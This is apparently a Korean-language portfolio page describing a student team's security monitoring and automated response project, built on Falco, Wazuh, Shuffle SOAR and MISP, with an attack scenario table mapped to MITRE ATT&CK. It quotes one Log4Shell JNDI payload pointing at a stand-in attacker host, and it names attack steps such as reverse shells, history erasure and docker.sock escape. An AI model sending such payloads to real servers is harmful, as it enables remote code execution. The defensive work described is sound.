---
layout: project
title: "MITRE ATT&CK 기반 지능형 침해사고 분석 및 자동 대응 시스템 구축"
summary: "제로데이 역직렬화 공격에 대해 Falco(커널 시스템 콜 감시) + Wazuh(SIEM) + Shuffle(SOAR)를 결합하여, 탐지부터 격리까지 10초 이내 자동 대응을 실현한 차세대 보안 운영 아키텍처를 설계하고 실제 구현했습니다."
image: assets/images/google-cloud-backup.png
technologies: [Wazuh, Falco, Shuffle, OPNsense, MISP, AbuseIPDB, Docker, Ansible, Python]
github:
categories: security
---

## 프로젝트 배경

기존 경계 보안 솔루션(FW, IPS, WAF)은 시그니처 기반으로 동작하여 제로데이 역직렬화(Deserialization) 공격 페이로드를 정상 트래픽으로 오인합니다. OWASP Top 10:2021 "Software and Data Integrity Failures"와 CWE-502 위협이 증가하는 가운데, **"Assume Breach(침해가정)"** 전제 하에 내부 프로세스 레벨에서 이상 징후를 식별하고 자동 대응하는 차세대 보안 운영 모델의 필요성이 대두되었습니다.

이를 위해 Falco(커널 시스템 콜 감시) + Wazuh(SIEM) + Shuffle(SOAR) 기반의 통합 탐지·대응 시스템을 구축하여, **탐지부터 격리까지 10초 이내 자동 대응**을 실현했습니다.

## 주요 기능

### 1. 커널 레벨 행위 탐지 (Falco)
커널 모듈 기반으로 시스템 콜(execve, connect, openat 등)을 실시간 감시합니다. Kill Chain 6단계에 대응하는 커스텀 YAML 룰을 설계하여 RCE 및 리버스 쉘, 정찰 행위, 파일리스 페이로드·랜섬웨어, 권한 상승(SUID 탐색), 안티 포렌식(히스토리 삭제, docker.sock 접근) 등을 탐지합니다. 부모-자식 프로세스 계보(Lineage)를 추적하여 계보 세탁 우회도 방지합니다.

### 2. 통합 로그 수집·상관 분석 (Wazuh)
Wazuh Agent로 분산 로그를 수집하고, FIM(파일 무결성 감시)으로 랜섬웨어 대량 파일 수정/삭제 패턴을 상관분석합니다. SCA(보안 설정 진단)로 CIS Benchmarks 준거성을 검토하고, SUID/SGID 오설정을 감지하여 위험도 가중치로 활용합니다. 모든 탐지 이벤트에 MITRE ATT&CK Technique ID를 자동 태깅합니다.

### 3. 상태유지(Stateful) 스코어링 엔진 (Shuffle SOAR)
Shuffle에서 7단계 판단 프로세스를 거쳐 위험도를 정량화합니다.

1. **필터링**: Wazuh Level 12+ 고위험 로그만 선별
2. **상태 확인**: Shuffle Cache로 과거 공격 이력 조회 (Agent ID 기반 세션 관리)
3. **IP 분석**: proc.cmdline에서 IP 추출 → AbuseIPDB 평판 조회
4. **FIM·MISP 교차 검증**: 10분 윈도우 내 파일 변경 확인, 해시값 MISP 대조
5. **SCA 위험도 반전**: RiskScore = 100 - SCA\ Score (취약한 서버일수록 가중치 증가)
6. **가중 스코어링**: 행위별 차등 점수를 통한 가중치 부여 (랜섬웨어 +20, RCE/리버스쉘 +15, 권한 상승 +12 등)
7. **등급 판정·대응 실행**

### 4. 단계적 자동 대응

| 등급 | 임계치 | 대응 조치 |
|------|--------|----------|
| **Critical** | ≥100점 | 에이전트 네트워크 격리 + 악성 프로세스 Kill + 포렌식 스냅샷(휘발성 증거 보존) |
| **High** | ≥70점 | OPNsense API → 공격자 IP 자동 차단 |
| **Warning** | ≥40점 | Slack 알림 (IP, 파일 변경 이력, 평판 점수 포함) |

## 시스템 아키텍처

![시스템 아키텍처](/assets/images/Network%20Architecture.jpg)

### 5단계 데이터 처리 파이프라인
1. **수집(Collection)**: Falco + Wazuh → Webhook → Shuffle
2. **정규화(Normalization)**: 이기종 로그 표준화, Agent ID 기반 자산 매칭
3. **다차원 분석(Analysis)**: IP 평판(AbuseIPDB), 해시(MISP), SCA 취약도 동시 분석
4. **상관분석·스코어링(Scoring)**: 가중치 기반 누적 점수 산출
5. **자동 대응(Response)**: 등급별 단계적 차단·격리

## 공격 시나리오 (React2Shell 기반 7단계)

다중 언어(Java/PHP/Node.js) 역직렬화 취약점을 선행 연구한 뒤, **공격 성공 후 시스템 행위가 수렴**한다는 발견을 토대로 React2Shell 기반 통합 공격 시나리오를 설계했습니다.

| 단계 | 공격 행위 | MITRE ATT&CK | 탐지 등급 |
|------|----------|-------------|----------|
| 1. 초기 침투 + C2 | React2Shell 페이로드 → 리버스 쉘 | TA0001(T1190) + TA0011(T1573.002) | **CRITICAL** |
| 2. 정찰 | env, whoami, ifconfig (Low&Slow) | TA0007(T1082, T1016) | WARNING |
| 3. 방어 회피 | HISTFILE=/dev/null, 히스토리 삭제 | TA0005(T1070.003) | **CRITICAL** |
| 4. 권한 상승 | SUID 바이너리 탐색 | TA0004(T1548.001) | **CRITICAL** |
| 5. 파일리스 실행 | Python 메모리 내 실행 + openssl 파일 암호화 | TA0002(T1059.006) + TA0040(T1486) | **CRITICAL** |
| 6. 지속성 | API Route에 eval() 백도어 삽입 | TA0003(T1505.003) | DETECT |
| 7. 컨테이너 탈출 | docker.sock 악용 → 호스트 루트 → 로그 삭제 | TA0004(T1611) + TA0005(T1070) | **CRITICAL** |

## 공격 시나리오 시현

<video width="100%" height="auto" controls>
  <source src="/assets/videos/Interrupt_attack.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

## 담당 업무

4명으로 구성된 팀에서 팀장으로서 **Java 역직렬화 공격 연구**, **Wazuh SIEM 대시보드·기능 연구 및 구축**, **MISP 위협 인텔리전스 연동**, **Active Response 포렌식 스크립트 개발**, **침해사고 분석 보고서 및 보고서 총괄**을 담당했습니다.

### 1. Java 역직렬화(Log4Shell) 공격 연구

다중 언어 역직렬화 취약점 분석의 Java 파트를 담당하여, CVE-2021-44228(Log4Shell) 기반 공격 시나리오를 연구·구현했습니다.

- Log4j2 라이브러리의 JNDI Lookup 기능을 악용한 공격 체인을 구성했습니다. 공격자가 `${jndi:ldap://attacker.com/exploit}` 형태의 페이로드를 전송하면, 서버가 외부 LDAP/RMI 서버에 콜백을 보내고, 악성 클래스를 로드하여 원격 코드 실행(RCE)이 이루어지는 전체 과정을 Docker 환경에서 재현했습니다.
- RCE 성공 직후 컨테이너 내부에서 PID 1(Java 프로세스)의 자식으로 `/bin/sh`가 Fork되는 비정상 프로세스 계보를 포착했습니다. 정상 운영 환경에서는 웹 애플리케이션 프로세스가 쉘을 생성하지 않으므로, 이 패턴을 Falco 커스텀 룰의 핵심 탐지 조건으로 제안했습니다. 이후 PHP(`php-fpm` → `/bin/sh`)와 Node.js(`node` → `/bin/sh`)에서도 동일한 패턴이 재현되어, **"역직렬화 진입점은 언어마다 다르지만, 공격 성공 후 시스템 콜 레벨의 행위는 수렴한다"**는 프로젝트 핵심 가설을 실증하는 근거가 되었습니다.
- Java의 `readObject()` Gadget Chain 동작 원리를 분석한 뒤, PHP 매직 메서드(`__wakeup`, `__destruct`)와 Node.js Prototype Pollution의 실행 흐름을 비교했습니다. 세 언어 모두 **객체 복원 시점에 임의 코드가 실행**된다는 공통 메커니즘을 확인하고, 이를 기반으로 언어에 종속되지 않는 시스템 콜 기반 공통 탐지 정책을 수립하는 데 기여했습니다.

### 2. Wazuh SIEM 대시보드·기능 연구 및 구축

Wazuh Manager의 핵심 기능(디코더/룰 엔진, FIM, SCA, CDB 리스트, Active Response)을 연구하고 프로젝트에 맞게 구성했습니다.

- Wazuh의 CDB(Constant Database) 리스트에 악성 IP/해시 목록을 등록하여, Falco에서 전달된 이벤트의 IoC(Indicator of Compromise)를 실시간으로 대조할 수 있도록 설정했습니다.
- Wazuh 대시보드에서 MITRE ATT&CK 매핑 뷰를 구성하여, 탐지된 이벤트가 ATT&CK 매트릭스의 어느 단계(Tactic/Technique)에 해당하는지 시각적으로 파악할 수 있게 했습니다.
- FIM 설정을 통해 컨테이너 내 웹 애플리케이션 디렉토리(예: `/app/src/`, `/uploads/`)의 파일 변경을 실시간 감시하고, 10분 윈도우 내 대량 변경 발생 시 랜섬웨어 의심 이벤트로 분류하는 상관분석 룰을 구성했습니다.
- SCA 진단 결과를 스코어링 엔진의 입력값으로 활용하기 위해, $RiskScore = 100 - SCA\ Score$ 공식을 설계하여 보안 설정이 취약한 서버일수록 동일한 탐지 이벤트에 더 높은 위험도를 부여하도록 했습니다.

### 3. MISP 위협 인텔리전스 연동

외부 위협 인텔리전스(TI)를 스코어링 엔진에 통합하기 위해 MISP(Malware Information Sharing Platform)를 Shuffle 워크플로우에 연동했습니다.

- MISP 서버에 악성 파일 해시, C2 서버 IP 등의 IoC 이벤트를 등록하고, Shuffle 워크플로우에서 Wazuh FIM이 감지한 파일의 해시값을 MISP API로 자동 조회하여 악성 여부를 판별하는 파이프라인을 구축했습니다.
- AbuseIPDB와 MISP를 병행 조회하여, IP 평판(AbuseIPDB)과 IoC 매칭(MISP) 결과를 스코어링 엔진에 ×0.1 보조 가중치로 반영하는 교차 검증 로직을 설계했습니다. 외부 지표를 보조 가중치로 제한한 이유는 TI 데이터의 오탐 가능성을 고려하여 내부 행위 기반 탐지에 우선순위를 두기 위함이었습니다.

### 4. Active Response 포렌식 스크립트 개발

Critical 등급 대응 시 격리 전 **휘발성 증거를 선제적으로 보존**하기 위한 Wazuh Active Response 스크립트를 개발했습니다.

- 스코어링 결과 Critical(≥100점)로 판정된 에이전트에 대해, 네트워크 격리와 프로세스 Kill을 실행하기 **직전에** netstat(네트워크 연결 상태), process list(실행 중인 프로세스), 환경변수, 열린 파일 목록 등 휘발성 데이터를 자동으로 수집하여 로컬에 스냅샷으로 저장하는 Wazuh Active Response 스크립트를 작성했습니다.
- 격리 후에는 네트워크 연결이 끊어져 리버스 쉘의 원격 IP, 공격자의 세션 정보 등이 소멸되므로, 격리 전 증거 수집이 포렌식 완전성 확보에 필수적이었습니다. 이 스크립트를 통해 사후 분석 시 공격 경로를 완전하게 재구성할 수 있는 기반을 마련했습니다.

### 5. 침해사고 분석 보고서 및 보고서 총괄

팀장으로서 주간보고서, 보고서 초안(1차~3차), 발표 대본, 최종 보고서까지 전체 문서 작성을 총괄했습니다.

- 매주 팀원별 진행 상황을 종합하여 주간보고서를 작성하고, 진척률과 리스크를 관리했습니다. 4주차에 시나리오 재설계가 필요하다는 판단이 내려졌을 때, 3개 언어 공통점을 도출하여 React2Shell 단일 시나리오로 통합하는 방향 전환을 주도하고 이를 보고서에 반영했습니다.
- 보고서 초안을 3차까지 반복 수정하며, 기술적 세부 사항(Falco 룰 설계 근거, 솔루션 선정 비교표, 스코어링 가중치 산출 근거)과 경영적 효과(MTTR 98% 단축, 노이즈 85% 제거)를 모두 포함하는 구조로 완성했습니다.

## 기술 스택

| 분류 | 기술/솔루션 | 역할 |
|------|-------------|------|
| **런타임 보안** | Falco | 커널 시스템 콜 실시간 감시, 커스텀 YAML 룰 기반 탐지 |
| **SIEM/HIDS** | Wazuh | 통합 로그 수집·정규화, FIM, SCA, 디코더/룰 엔진, Active Response |
| **SOAR** | Shuffle | 워크플로우 기반 오케스트레이션, 스코어링 엔진, 자동 대응 파이프라인 |
| **TI** | MISP, AbuseIPDB | 악성 해시/IP 평판 조회, IoC 대조 |
| **방화벽** | OPNsense | 경계 방어, API 기반 IP 자동 차단 |
| **컨테이너** | Docker | 취약 서비스(Next.js, Java, PHP) 격리 환경 구축 |
| **IaC** | Ansible | Falco 룰 배포 자동화, 멱등성 보장 |
| **자동화** | Python | Wazuh API 연동, 웹훅, 포렌식 스크립트 |

### 솔루션 선정 근거

- **Falco** (vs Aqua Tracee, AppArmor/Seccomp): 커널 모듈 기반 시스템 콜 가시성, YAML 커스텀 룰 유연성, gRPC/Output 포워딩으로 Wazuh·SOAR 연동 용이
- **Wazuh** (vs ELK Stack, Splunk, Graylog): 보안 특화 기능 내장(HIDS/FIM/SCA), 웹훅으로 Shuffle 실시간 연동, 오픈소스 무료
- **Shuffle** (vs Tines, Walkoff): 6,000+ 앱 에코시스템, Wazuh/Falco 전용 모듈, 완전 오픈소스, 커스텀 스코어링 구현 가능

## 문제 해결 과정

### 1. Sysmon → Falco 전환
**문제**: 초기 설계에서 프로세스 모니터링 도구로 Sysmon을 선정했으나, Ubuntu 환경에서 호환되지 않았습니다.<br>
**해결**: 커널 모듈 기반 Falco로 전환하여 Linux 환경에서 시스템 콜 레벨의 가시성을 확보했습니다.

### 2. Falco 기본 룰 노이즈 과다
**문제**: Falco 기본 룰셋이 정상 작업(패키지 설치, 컨테이너 빌드 등)에도 대량의 경고를 발생시켜 실제 위협을 식별하기 어려웠습니다.<br>
**해결**: 커스텀 룰을 튜닝하고 화이트리스트를 설정하여 노이즈를 제거했습니다. 또한 `proc.pcmdline`에 `-i`(대화형) 옵션 검사 로직을 추가하여 관리자 정상 작업과 공격자 행위를 구분했습니다.

### 3. TheHive+Cortex → Shuffle 전환
**문제**: 초기 SOAR 솔루션으로 TheHive+Cortex를 선정했으나, 워크플로우 유연성과 앱 연동 범위에 한계가 있었습니다.<br>
**해결**: 유연한 오픈소스 환경과 No-Code 워크플로우를 제공하는 Shuffle로 전환하여, Wazuh 웹훅 → 스코어링 → 자동 대응까지의 파이프라인을 유연하게 구축했습니다.

### 4. 공격 시나리오 통합 재설계
**문제**: Java, PHP, Node.js 각각에 대해 별도 시나리오를 운영하면서 탐지 룰이 언어별로 파편화되고, 테스트·관리 비용이 증가했습니다.<br>
**해결**: 3개 언어의 역직렬화 공격 후 시스템 행위가 수렴(비정상 쉘 생성)한다는 발견을 토대로, React2Shell 기반 단일 통합 시나리오로 재설계하여 범용 탐지 정책을 수립했습니다.

### 5. Shuffle 누적 점수 계산 오류
**문제**: Shuffle Cache 기반 스코어링에서 캐시 초기화 타이밍 문제로 누적 점수가 정상적으로 합산되지 않는 버그가 발생했습니다.<br>
**해결**: 캐시 초기화 로직을 수정하고, Agent ID 기반 세션 관리에서 합산 로직을 고도화하여 상태유지(Stateful) 스코어링이 정확하게 동작하도록 했습니다.

## 성과

| 지표 | 수동 대응 | SOAR 자동 대응 | 개선율 |
|------|----------|--------------|--------|
| **MTTR** (탐지→조치) | 15~30분 | **10초 이내** | **98%+ 단축** |

| 시나리오 | 공격 유형 | 탐지율(TDR) | 대응 성공률 |
|----------|----------|-------------|-----------|
| SC-01 | 역직렬화 기반 Remote Shell | **100%** | **100%** |
| SC-02 | Ransomware 행위 (FIM) | **85%** | **100%** |
| SC-03 | 권한 상승 및 내부망 이동 | **90%** | **80%** |

